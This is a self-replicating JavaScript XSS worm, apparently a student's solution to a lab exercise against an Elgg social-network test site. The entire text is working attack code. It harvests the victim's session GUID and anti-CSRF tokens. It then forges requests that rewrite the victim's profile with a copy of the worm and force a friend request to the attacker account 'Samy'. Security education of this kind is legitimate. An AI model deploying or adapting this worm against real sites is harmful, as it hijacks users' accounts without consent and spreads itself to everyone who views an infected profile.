<script type="text/javascript" id="worm">
    window.onload = function () {
    // Retrieve victim's session tokens and ID
    var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
    var jsCode = document.getElementById("worm").innerHTML;
    var tailTag = "</" + "script > ";

//Put it all together with URI encoding
var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);

var elggToken = elgg.security.token.__elgg_token;
var elggTs = elgg.security.token.__elgg_ts;
var victimGuid = elgg.session.user.guid;

// Retrieve Samy's GUID to avoid re-infecting Samy's profile
//var samyGuid = elgg.page_owner.guid;
var samyGuid = 47;

// Construct the POST request URL to modify the victim's profile "About me"
var sendurl = "http://www.xsslabelgg.com/action/profile/edit";

// New "About me" content to be inserted
var content = "guid=" + victimGuid
    + "&__elgg_token=" + elggToken
    + "&__elgg_ts=" + elggTs
    + "&description=Samy is my HERO (added by Thunga Geethika)" + wormCode;

// Ensure the victim's profile is modified, not Samy's
if (victimGuid !== samyGuid) {
    // Create and send the AJAX POST request to update the "About me" field
    var Ajax = new XMLHttpRequest();
    Ajax.open("POST", sendurl, true);
    Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
    Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    Ajax.send(content);
}

// Add Samy as a friend by sending a forged GET request
var addFriendUrl = "http://www.xsslabelgg.com/action/friends/add?friend=" + samyGuid +
    "&__elgg_ts=" + elggTs + "&__elgg_token=" + elggToken;

var AjaxFriend = new XMLHttpRequest();
AjaxFriend.open("GET", addFriendUrl, true);
AjaxFriend.setRequestHeader("Host", "www.xsslabelgg.com");
AjaxFriend.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
AjaxFriend.send();

// Copy the worm and inject it into the victim's profile to propagate it further
var scriptElement = document.createElement('script');
scriptElement.type = 'text/javascript';
scriptElement.innerHTML = document.getElementById("worm").innerHTML;

// URL encode the malicious JavaScript worm
var encodedScript = encodeURIComponent(scriptElement.innerHTML);
var wormPropagationUrl = "http://www.xsslabelgg.com/action/profile/edit";
var wormContent = "guid=" + victimGuid
    + "&__elgg_token=" + elggToken
    + "&__elgg_ts=" + elggTs
    + "&description=" + encodedScript;

// Send the encoded worm as a POST request to propagate it
var AjaxWorm = new XMLHttpRequest();
AjaxWorm.open("POST", wormPropagationUrl, true);
AjaxWorm.setRequestHeader("Host", "www.xsslabelgg.com");
AjaxWorm.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
AjaxWorm.send(wormContent);
};
</script >

